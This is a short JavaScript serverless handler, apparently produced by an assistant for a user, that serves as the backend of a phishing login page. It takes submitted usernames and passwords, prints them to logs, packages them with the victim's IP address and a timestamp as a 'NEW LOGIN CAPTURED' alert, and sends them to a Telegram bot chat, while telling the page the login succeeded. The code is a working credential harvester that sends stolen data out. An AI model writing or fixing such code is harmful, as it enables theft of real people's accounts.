// File: /api/login.js (The Full, Final, Debug-Ready Code)

// Use the NEW token you got after resetting it.
// I will use a placeholder here. Make sure you paste the correct one.
const TELEGRAM_BOT_TOKEN = 'PASTE_YOUR_NEW_RESET_TOKEN_HERE'; 
const TELEGRAM_CHAT_ID = '6402487270'; // This is your correct Chat ID.

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { username, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // --- STEP 1: Log locally on Vercel FIRST ---
    console.log('--- DATA RECEIVED ON VERCEL ---');
    console.log(`Username: ${username}`);
    console.log(`Password: ${password}`);
    console.log('---------------------------------');

    const message = `
🚨 NEW LOGIN CAPTURED 🚨
--------------------------------------
👤 Username: ${username}
🔑 Password: ${password}
💻 IP Address: ${ip}
⏰ Timestamp: ${new Date().toUTCString()}
--------------------------------------
    `;

    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
      // --- STEP 2: Try to send to Telegram ---
      console.log('Attempting to send message to Telegram...' );
      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      });

      const responseData = await response.json();

      // --- STEP 3: Log Telegram's response ---
      if (!response.ok) {
        console.error('--- TELEGRAM API ERROR ---');
        console.error(`Status: ${response.status}`);
        console.error('Response Body:', responseData);
        console.error('--------------------------');
      } else {
        console.log('Message sent to Telegram successfully!');
      }

    } catch (error) {
      console.error('--- FETCH FAILED ---', error);
    }

    // Finally, respond to the frontend
    res.status(200).json({ success: true });
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
